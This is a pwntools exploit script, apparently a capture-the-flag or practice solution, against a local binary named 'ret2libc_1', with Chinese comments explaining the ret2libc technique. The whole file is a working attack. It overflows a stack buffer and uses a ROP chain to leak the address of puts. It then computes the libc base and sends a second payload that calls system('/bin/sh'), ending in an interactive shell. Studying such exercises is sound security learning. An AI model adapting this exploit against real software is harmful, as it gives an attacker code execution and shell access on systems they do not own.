from pwn import *
#from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './ret2libc_1'
io=process(pwnfile)

elf = ELF(pwnfile)

def debug():
	gdb.attach(io)
	pause()

debug()

pad = 0xd0
# pie
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_adr = elf.symbols['main']		# 找符号表

#main_adr = 0x0401225 # offset + elf_base

pop_rdi = 0x0400963		# pop rdi ; ret
pay = b'a'*pad+b'b'*8+p64(pop_rdi)+p64(puts_got)		# pop_ret
pay += p64(puts_plt)+p64(main_adr)				#

#ay = b'z'*0x30+p64(pop_rdi)+p64(puts_got)

ret = pop_rdi + 1 # pop rip

io.sendlineafter("Please tell me:",pay)
puts_adr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
#     u64(io.recv(6).ljust(8,b'\x00'))		p64 <-> u64

print("puts_adr-->",hex(puts_adr))

libc = ELF("./libc.so.6")

libc_base = puts_adr-libc.sym['puts']   #symbol
sys_adr = libc_base+libc.sym['system']			#  system(/bin/sh)
bin_sh = libc_base+libc.search(b'/bin/sh').__next__()	# .search返回的是生成器,用next来获取第一个匹配的地址

print("libc_base-->",hex(libc_base))

#debug()
ret = pop_rdi + 1 

pay1 = b'a'*pad+b'b'*8+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(sys_adr)   # 
io.sendlineafter("Please tell me:",pay1)

io.interactive()

'''
###############################
x64  rdi,rsi,rdx,...
pop rdi  --->  把rsp地址内容取出来给rdi

pop rdi;ret


libc_system  ->  vmmap \  print system


1、泄露libc地址

	got  存放_libc具体实现函数的地址
	plt  执行_libc函数的指令片段

puts_plt(got)  --> main  第二次利用 --> system
	
ret  --> pop rip   --->把rsp地址内容取出来给rip

puts(puts_got)


	
1、栈溢出	puts(puts_got)	---->  回到main
		recv()--> libc_addr
2、main->第二次栈溢出	system("/bin/sh")





























'''
